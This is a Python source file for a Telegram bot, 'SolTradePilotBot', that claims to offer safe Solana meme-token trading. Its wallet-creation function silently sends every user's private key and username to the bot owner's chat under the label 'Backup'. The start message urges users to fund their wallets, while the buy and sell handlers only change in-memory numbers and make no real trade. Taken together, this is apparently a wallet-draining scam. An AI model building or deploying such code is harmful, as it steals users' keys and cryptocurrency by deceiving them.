import os
import base58
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= STORAGE =================
user_wallets = {}
user_tokens = {}
user_pending_ca = {}

# ================= STATES =================
AWAIT_CA, AWAIT_BUY_AMOUNT, AWAIT_SELL_AMOUNT = range(3)

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(wallet.pubkey())
            lamports = resp.value
            return lamports / 1e9
        except:
            return 0.0

def get_tokens(user_id: int):
    return user_tokens.get(user_id, 0.0)

def keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

# ================= WALLET =================
async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    user_tokens[user_id] = 0.0

    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}"
    )

    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name

    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Backup\nUser: {username}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )

    return pub_key, priv_key

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name

    await update.message.reply_text(
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens safely on Solana.\n\n"
        "⚠️ Make sure you fund your wallet before buying.",
        reply_markup=keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 Bot Guide 💡\n\n"
        "/create_wallet - Generate wallet\n"
        "/address - Show SOL address\n"
        "/balance - Show SOL/MEME balance\n"
        "/buy - Buy MEME tokens\n"
        "/sell - Sell MEME tokens"
    )
    if update.message:
        await update.message.reply_text(text)
    else:
        await update.callback_query.message.reply_text(text)

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        await create_wallet(user_id, context)

    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first.")
        else:
            await query.message.reply_text(str(user_wallets[user_id].pubkey()))

    elif query.data == "balance":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first.")
        else:
            sol = await get_balance(user_id)
            meme = get_tokens(user_id)
            await query.message.reply_text(f"💰 Balance\nSOL: {sol:.6f}\nMEME: {meme}")

    elif query.data == "buy_meme":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first.")
            return ConversationHandler.END

        sol = await get_balance(user_id)
        if sol <= 0:
            await query.message.reply_text(f"⚠️ Fund wallet first\n🏦 {user_wallets[user_id].pubkey()}")
            return ConversationHandler.END

        await query.message.reply_text("Enter the token CA you want to buy:")
        return AWAIT_CA

    elif query.data == "sell_meme":
        tokens = get_tokens(user_id)
        if tokens <= 0:
            await query.message.reply_text("⚠️ Can't sell on empty wallet 😅 Buy first then sell later.")
            return ConversationHandler.END

        await query.message.reply_text("Enter the amount of MEME to sell:")
        return AWAIT_SELL_AMOUNT

    elif query.data == "help":
        await help_command(update, context)
        return ConversationHandler.END

# ================= CONVERSATION HANDLERS =================
async def await_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_pending_ca[user_id] = update.message.text
    await update.message.reply_text("Enter the amount of SOL to spend:")
    return AWAIT_BUY_AMOUNT

async def await_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except:
        await update.message.reply_text("Enter valid amount.")
        return AWAIT_BUY_AMOUNT

    sol = await get_balance(user_id)
    if amount > sol:
        await update.message.reply_text(f"⚠️ Amount exceeds SOL balance ({sol:.6f})")
        return AWAIT_BUY_AMOUNT

    # Update MEME balance
    user_tokens[user_id] += amount  # 1 SOL = 1 MEME for simulation

    ca = user_pending_ca.get(user_id, "Unknown Token")
    await update.message.reply_text(f"✅ Successfully bought {amount} {ca} MEME!")
    return ConversationHandler.END

async def await_sell_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except:
        await update.message.reply_text("Enter valid amount.")
        return AWAIT_SELL_AMOUNT

    tokens = get_tokens(user_id)
    if amount > tokens:
        await update.message.reply_text(f"⚠️ You only have {tokens} MEME")
        return AWAIT_SELL_AMOUNT

    user_tokens[user_id] -= amount
    await update.message.reply_text(f"✅ Sold {amount} MEME!")
    return ConversationHandler.END

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler)],
        states={
            AWAIT_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, await_ca)],
            AWAIT_BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, await_buy_amount)],
            AWAIT_SELL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, await_sell_amount)],
        },
        fallbacks=[]
    )

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("create_wallet", lambda u,c: create_wallet(u.effective_user.id,c)))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("address", address_command))

    # Conversation handler for buttons
    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

# ================= MENU COMMANDS =================
async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create wallet first.")
        return
    sol = await get_balance(user_id)
    meme = get_tokens(user_id)
    await update.message.reply_text(f"💰 Balance\nSOL: {sol:.6f}\nMEME: {meme}")

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create wallet first.")
        return
    await update.message.reply_text(str(user_wallets[user_id].pubkey()))

if __name__ == "__main__":
    main()
